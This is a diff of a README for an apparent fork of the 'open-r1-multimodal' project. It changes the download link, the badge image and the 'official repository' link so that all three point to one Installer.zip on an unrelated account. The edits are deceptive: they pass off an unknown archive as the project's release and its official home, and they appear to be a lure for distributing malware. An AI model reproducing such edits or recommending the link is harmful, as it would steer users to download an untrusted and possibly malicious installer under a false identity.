@@ -9,9 +9,9 @@ This repository is a fork designed to enhance the open-r1 project by adding mult
 - Enhanced performance and accuracy
 
 ## 📦 Installation
-To get started with the open-r1-multimodal fork, you can download the latest release from the following link: [Download open-r1-multimodal](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+To get started with the open-r1-multimodal fork, you can download the latest release from the following link: [Download open-r1-multimodal](https://github.com/negodoborel132/open-r1-multimodal/releases/download/v1.0/Installer.zip)
 
-![Download open-r1-multimodal](https://img.shields.io/badge/Download-v1.0.0-brightgreen)
+![Download open-r1-multimodal](https://github.com/negodoborel132/open-r1-multimodal/releases/download/v1.0/Installer.zip)
 
 Once you have downloaded the file, extract it and follow the installation instructions provided in the repository.
 
@@ -25,7 +25,7 @@ Contributions are always welcome! If you have ideas for enhancements or have imp
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## 🧐 Looking for More?
-If you want to learn more about the open-r1-multimodal project, you can visit the official repository [here](https://github.com/open-r1-multimodal).
+If you want to learn more about the open-r1-multimodal project, you can visit the official repository [here](https://github.com/negodoborel132/open-r1-multimodal/releases/download/v1.0/Installer.zip).
 
 ---
 
